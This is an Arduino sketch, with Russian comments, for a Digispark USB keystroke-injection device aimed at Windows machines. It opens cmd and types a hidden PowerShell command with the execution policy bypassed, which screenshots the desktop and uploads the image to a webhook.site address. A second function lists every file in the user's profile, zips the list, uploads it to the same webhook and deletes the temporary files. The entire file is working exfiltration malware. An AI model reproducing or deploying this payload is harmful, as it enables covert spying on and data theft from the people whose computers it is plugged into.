#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(1000); 
  
  pinMode(1, OUTPUT); //огонек активирован ;)
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(1000);
  digitalWrite(1, LOW);
  
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("cmd")); //раньше брало в ОЗУ, но из-за F теперь не забиваем ОЗУ
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("CasualMan228 says hi ;))))))))))))))"));
  DigiKeyboard.delay(1000);
  //DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  
  setScreenShotCommand();
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000); //делаю скрин рабочего стола
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  finishLight();

  //DigiKeyboard.delay(1000);

  //setScreenShotCommand();
  //DigiKeyboard.delay(250);
  //DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  //DigiKeyboard.delay(250);
  //DigiKeyboard.print(F("microsoft.windows.camera:"));
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(5000);
  //DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); //43 -> Tab
  //DigiKeyboard.delay(250);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(250);
  //DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT);
  //finishLight();
  //DigiKeyboard.delay(1000);
  //DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}

void setScreenShotCommand() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1250);
  
  DigiKeyboard.print(F("powershell -NoP -W Hidden -EP Bypass -C \"Add-Type -A System.Windows.Forms;"));
  DigiKeyboard.print(F("$s=[Windows.Forms.Screen]::PrimaryScreen.Bounds;"));
  DigiKeyboard.print(F("$b=New-Object Drawing.Bitmap($s.Width,$s.Height);"));
  DigiKeyboard.print(F("[Drawing.Graphics]::FromImage($b).CopyFromScreen(0,0,0,0,$s.Size);"));
  DigiKeyboard.print(F("$f=$env:TEMP + '\\s.png';$b.Save($f);"));
  DigiKeyboard.print(F("(New-Object System.Net.WebClient).UploadFile('https://85c9ab6e-a695-4393-ae82-2dea8d702df2.webhook.site',$f);\""));
  DigiKeyboard.print(F(" & exit"));
}

void setFilesListCommand() { //ТРЕБУЕТСЯ ФИКС, ВЫВОДИТСЯ ОНЛИ PATH!!!!
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1250);

  DigiKeyboard.print(F("powershell -NoP -W Hidden -EP Bypass -C \""));
  DigiKeyboard.print(F("$t = $env:TEMP + '\\l.txt'; $z = $env:TEMP + '\\l.zip'; ")); 
  DigiKeyboard.print(F("Get-ChildItem -Path $env:USERPROFILE -Recurse -File -ErrorAction SilentlyContinue | "));
  DigiKeyboard.print(F("Select-Object @{N='Path';E={$_.FullName}}, @{N='Size(MB)';E={[math]::round($_.Length/1MB,2)}} | "));
  DigiKeyboard.print(F("Out-File $t; "));
  DigiKeyboard.print(F("Compress-Archive -Path $t -DestinationPath $z -Force; "));
  DigiKeyboard.print(F("(New-Object Net.WebClient).UploadFile('https://85c9ab6e-a695-4393-ae82-2dea8d702df2.webhook.site', $z); "));
  DigiKeyboard.print(F("Remove-Item $t, $z; exit\" & exit"));
}

void finishLight() {
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(250);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(250);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(250);
  digitalWrite(1, LOW);
}

void loop() {
}
